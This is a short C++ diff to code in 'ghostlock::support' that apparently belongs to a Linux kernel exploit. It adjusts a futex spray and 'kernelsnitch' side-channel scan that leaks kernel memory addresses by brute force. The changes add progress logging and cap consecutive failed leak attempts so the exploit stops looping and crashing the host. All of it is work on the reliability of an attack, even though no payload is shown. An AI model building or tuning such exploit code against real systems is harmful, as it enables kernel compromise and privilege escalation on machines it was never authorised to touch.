@@ -590,11 +590,15 @@ namespace ghostlock::support {
                     if (scan_done > scan_total) scan_done = scan_total;
                     size_t scan_id = (scan_done * 4096) | ((scan_done * 8) % 4096);
                     if (scan_id > static_cast<size_t>FUTEX_SZ) scan_id = static_cast<size_t>FUTEX_SZ;
+                    /* v11.4: mm_probe != 0 means the mm brute-force pass is
+                     * running (collision phase leaves it at 0); without this
+                     * the parent beat could not tell the two phases apart. */
                     pr_info("[spray]   still finding collisions (%llds) %zu%% "
-                            "(futex 0x%zx/0x%zx)...\n",
+                            "(futex 0x%zx/0x%zx mm_probe=0x%zx)...\n",
                             waited / 1000,
                             scan_total ? scan_done * 100 / scan_total : 0,
-                            scan_id, (size_t) FUTEX_SZ);
+                            scan_id, (size_t) FUTEX_SZ,
+                            static_cast<size_t>(ks->mm_progress));
                     last_beat = waited;
                 }
                 usleep(50000);
@@ -606,6 +610,10 @@ namespace ghostlock::support {
         }
         if (!snitch.has_collisions()) {
             pr_warning("[spray] futex collisions not found\n");
+            /* v11.4: collision-failure attempts also run the full timing scan;
+             * count them into the same consecutive-failure streak as mm-leak
+             * failures so a noisy system cannot loop scans without end. */
+            g_mm_leak_fail_streak++;
             snitch.reset();
             for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                 kill_child(prepare_ctx.childs[i]);
@@ -761,11 +769,13 @@ namespace ghostlock::support {
                 pr_warning("prepare_kernel_page timeout after %u attempts\n", attempt);
                 break;
             }
-            /* v11.3: each failed attempt costs a full ~10s mm-leak scan; seven
-             * zero-gap cycles matched the 23:13:44 system avalanche exactly.
-             * Cap the streak and cool down before the next scan. */
+            /* v11.3/v11.4: each failed attempt costs a full ~10s kernelsnitch
+             * scan (collision discovery and/or mm brute force); seven zero-gap
+             * cycles matched the 23:13:44 system avalanche exactly. The streak
+             * covers both failure kinds; cap it and cool down before the next
+             * scan. */
             if (g_mm_leak_fail_streak >= 6) {
-                pr_warning("mm-leak failed %d consecutive scans; stopping prepare "
+                pr_warning("kernelsnitch failed %d consecutive attempts; stopping prepare "
                            "to avoid futex residue avalanche\n", g_mm_leak_fail_streak);
                 break;
             }
